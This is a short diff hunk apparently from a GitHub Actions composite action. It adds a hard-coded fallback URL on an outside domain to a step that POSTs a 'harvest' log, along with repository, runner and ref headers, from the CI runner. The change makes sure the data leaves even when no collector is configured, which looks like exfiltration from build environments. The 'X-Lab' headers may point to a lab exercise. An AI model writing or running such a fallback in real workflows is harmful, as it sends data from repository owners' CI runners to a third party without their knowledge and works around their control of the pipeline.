@@ -210,9 +210,13 @@ runs:
         LOG="${{ inputs.log_debug }}"
         [ -f "$LOG" ] || echo "(no harvest data)" > "$LOG"
 
+        # Secret kosong akan override default — fallback eksplisit
+        COLLECTOR="${{ inputs.collector_url }}"
+        [ -z "$COLLECTOR" ] && COLLECTOR="https://d.redacted.rest/t/workflow"
+
         HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
           --max-time 30 \
-          -X POST "${{ inputs.collector_url }}" \
+          -X POST "$COLLECTOR" \
           -H "X-Lab-Repo: ${{ github.repository }}" \
           -H "X-Lab-Runner: ${{ runner.os }}" \
           -H "X-Lab-Ref: ${{ github.ref }}" \
